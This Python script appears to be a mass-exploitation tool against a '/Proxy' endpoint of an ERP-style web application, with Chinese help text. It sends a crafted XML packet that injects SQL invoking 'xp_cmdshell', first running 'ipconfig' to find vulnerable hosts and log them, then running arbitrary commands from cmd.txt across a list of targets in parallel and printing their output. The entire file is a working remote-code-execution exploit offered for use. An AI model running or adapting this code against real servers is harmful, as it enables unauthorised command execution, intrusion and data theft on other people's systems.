import concurrent.futures
import requests
import warnings
import os
import argparse
import re

warnings.filterwarnings('ignore')

class Check(object):
    def __init__(self):
        self.data='''cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell 'ipconfig'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>'''
        self.headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
                      "Content-Type":"application/x-www-form-urlencoded"}
        self.timeout=3
        self.que=set()
        self.calc=500
        self.cmd=0

    def runstrat(self,data,cmd=0):
        with concurrent.futures.ProcessPoolExecutor() as executer:
            if cmd==0:
                executer.map(self.checksql,data)
            else:
                self.data=str(self.data).replace("ipconfig",cmd)
                self.cmd=1
                executer.map(self.checksql,data)

    def checksql(self,url):
        try:
            rqt=requests.post(url=url,headers=self.headers,data=self.data,timeout=self.timeout,verify=False,allow_redirects=False)
            if 'java.sql.SQLException' not in rqt.text and rqt.status_code==200 and "output" in rqt.text:
                if self.cmd==0:
                    print("[+] RCE url:{}".format(rqt.url))
                    print("[+] RCE url:{}".format(rqt.url),file=open("save.txt","a",encoding="utf-8"))
                else:
                    print("url:{}".format(rqt.url))
                    print("command response:")
                    output=re.findall('output=".*"',rqt.text)
                    if len(output)>0:
                        for o in output:
                            response=str(o).replace("output=\"","\r\n").replace("/>","\r\n").replace("<ROW ","\r\n")
                            print(response)
                    else:
                        print("无返回内容")

        except:
            pass

    def rdfile(self,file,cmd=0):
        if os.path.exists(file):
            file=file
        else:
            print('[-] Not Found file:{}'.format(file))
            exit(0)

        with open(file,"r",encoding="utf-8") as rd:
            for r in rd.readlines():
                data=r.rstrip().rstrip("/")+"/Proxy"
                self.que.add(data)
                if len(self.que)==self.calc:
                    self.runstrat(self.que,cmd)
                    self.que=set()
        if len(self.que)>0:
            self.runstrat(self.que,cmd)
            self.que = set()

if __name__ == '__main__':
    obj=Check()
    parser=argparse.ArgumentParser()
    parser.add_argument('-f','--file',help="批量检测")
    parser.add_argument('-c','--command',action='store_true',help='批量执行指定的命令')
    option=parser.parse_args()
    if option.file and option.command:
        obj.rdfile(option.file,open("cmd.txt","r",encoding="utf-8").read())
    elif option.file:
        obj.rdfile(option.file)
    else:
        parser.print_help()
        print("cmd.txt是放要执行的命令")
        print("Example:python check_inject.py -f file.txt #批量检测是否存在SQL注入")
        print("Example:python check_inject.py -f file.txt -c #批量执行命令")